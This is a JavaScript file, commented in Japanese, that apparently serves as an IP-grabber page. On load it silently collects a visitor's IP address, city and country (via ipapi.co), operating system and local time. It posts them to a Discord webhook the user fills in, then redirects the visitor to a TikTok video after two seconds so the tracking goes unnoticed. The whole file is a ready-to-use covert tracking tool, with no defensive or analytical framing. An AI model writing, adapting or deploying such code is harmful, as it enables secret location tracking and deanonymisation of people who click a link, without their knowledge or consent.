const WEBHOOK_URL = "ここにあなたのWebhookURL"; 
const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";

async function track() {
    try {
        console.log("情報取得中...");
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        const details = {
            os: navigator.platform,
            browser: navigator.userAgent,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            referrer: document.referrer || "直接アクセス",
            localTime: new Date().toLocaleString('ja-JP')
        };

        if (WEBHOOK_URL) {
            console.log("Discordに送信中...");
            // 【重要】await を使って、送信が終わるまで「待機」させます
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "📊 アクセス検出成功",
                        color: 15418782,
                        fields: [
                            { name: "🌐 IP", value: data.ip || "取得失敗", inline: true },
                            { name: "📍 場所", value: `${data.country_name} / ${data.city}`, inline: true },
                            { name: "📱 OS", value: details.os, inline: true },
                            { name: "🕒 時刻", value: details.localTime, inline: true }
                        ]
                    }]
                })
            });
            console.log("送信完了！");
        }
    } catch (e) {
        console.error("エラー:", e);
    }

    // 送信が終わってから2秒後にリダイレクト
    console.log("TikTokへ移動します...");
    setTimeout(() => {
        window.location.href = REDIRECT_URL;
    }, 2000);
}

track();
